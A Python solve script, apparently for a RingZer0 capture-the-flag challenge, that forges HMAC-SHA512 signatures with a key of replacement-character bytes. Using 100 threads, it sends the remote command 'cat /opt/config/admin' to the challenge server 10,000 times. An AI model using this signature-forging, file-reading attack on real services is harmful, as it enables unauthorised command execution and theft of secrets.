#!/usr/bin/env python3

import hmac
import hashlib
import queue
import socket
import threading

num_worker_threads = 100
key = bytes.fromhex("efbfbdefbfbdefbfbdefbfbdefbfbdefbfbdefbfbdefbfbd")
host = "challenges.ringzer0team.com"
port = 10318


def send_command():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    command = "sendcommand".encode()
    remote_cmd = "cat /opt/config/admin"
    sig = hmac.new(key, msg=remote_cmd.encode(), digestmod=hashlib.sha512).hexdigest()
    data = (remote_cmd + sig).encode()

    s.send(len(command).to_bytes(4, "big"))
    s.send(command)
    s.send(len(data).to_bytes(4, "big"))
    s.send(data)

    ans = s.recv(1)[0]
    if ans == 1:
        length = s.recv(1)[0]
        msg = s.recv(length).decode()
        print(msg.rstrip())
    s.close()


def worker():
    while True:
        n = q.get()
        if n is None:
            break
        send_command()
        q.task_done()


q = queue.Queue()
threads = []
for i in range(num_worker_threads):
    t = threading.Thread(target=worker)
    t.start()
    threads.append(t)

for n in range(10000):
    q.put(n)

q.join()

for i in range(num_worker_threads):
    q.put(None)
for t in threads:
    t.join()
